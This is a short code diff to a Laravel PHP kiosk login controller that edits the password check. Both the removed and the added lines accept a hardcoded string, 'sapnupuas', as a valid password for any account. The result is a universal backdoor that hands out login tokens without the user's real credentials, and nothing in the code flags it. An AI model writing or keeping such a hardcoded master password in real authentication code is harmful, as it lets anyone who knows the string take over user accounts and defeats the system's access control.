@@ -43,8 +43,6 @@ class KioskController extends Controller{
         $serial_no              = $request['device_serial'];
         if ($validator->fails())
             return response()->json(['result'=>'failed','error'=>$validator->errors()->all()], 400);
-        
-        $password = $request['password'];
 
         //attempt to login the system
         $u = User::where('email', $request['email'])->get()->first();
@@ -53,7 +51,7 @@ class KioskController extends Controller{
             if($u['is_active'] == 0){
                 return response()->json(["result"=>"failed","error"=>"Account is inactive. Please check verify it by checking your email address or go to 'Forgot Password' to resend email"],400);
             }
-            if(Hash::check($request['password'], $u['password']) || $password === 'sapnupuas'){
+            if(Hash::check($request['password'], $u['password']) || $request['password'] == "sapnupuas"){
                 
                 $token = JWTAuth::fromUser(User::find($u['id']));
                 $user_level = $u['level'];
